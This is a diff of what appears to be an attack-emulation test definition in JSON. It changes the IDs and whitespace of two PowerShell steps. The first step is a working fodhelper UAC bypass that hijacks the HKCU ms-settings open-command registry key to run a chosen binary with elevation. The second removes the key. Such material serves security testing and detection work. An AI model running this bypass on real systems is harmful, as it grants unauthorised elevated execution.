@@ -7,19 +7,19 @@
   ],
   "steps": [
     {
-      "id": "813deb24-cfe7-45d8-82b7-1d33e5d36b6f",
+      "id": "4b0fc202-41e1-4668-b241-3763119bcfa1",
       "type": "execute-command",
       "data": {
-        "command": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\fodhelper.exe\"\n",
+        "command": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\fodhelper.exe\"",
         "command_type": "powershell"
       },
       "elevation_required": false
     },
     {
-      "id": "a27437b2-1da3-4623-9760-5f7f5a755ea6",
+      "id": "efa0765c-6d99-4bc2-a08d-9f90e6366119",
       "type": "execute-command",
       "data": {
-        "command": "Remove-Item \"HKCU:\\software\\classes\\ms-settings\" -force -Recurse -ErrorAction Ignore\n",
+        "command": "Remove-Item \"HKCU:\\software\\classes\\ms-settings\" -force -Recurse -ErrorAction Ignore",
         "command_type": "powershell"
       },
       "elevation_required": false
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "813deb24-cfe7-45d8-82b7-1d33e5d36b6f",
+      "s": "4b0fc202-41e1-4668-b241-3763119bcfa1",
       "p": "on-success",
-      "o": "a27437b2-1da3-4623-9760-5f7f5a755ea6"
+      "o": "efa0765c-6d99-4bc2-a08d-9f90e6366119"
     },
     {
-      "s": "813deb24-cfe7-45d8-82b7-1d33e5d36b6f",
+      "s": "4b0fc202-41e1-4668-b241-3763119bcfa1",
       "p": "on-failure",
-      "o": "a27437b2-1da3-4623-9760-5f7f5a755ea6"
+      "o": "efa0765c-6d99-4bc2-a08d-9f90e6366119"
     }
   ],
   "tags": [
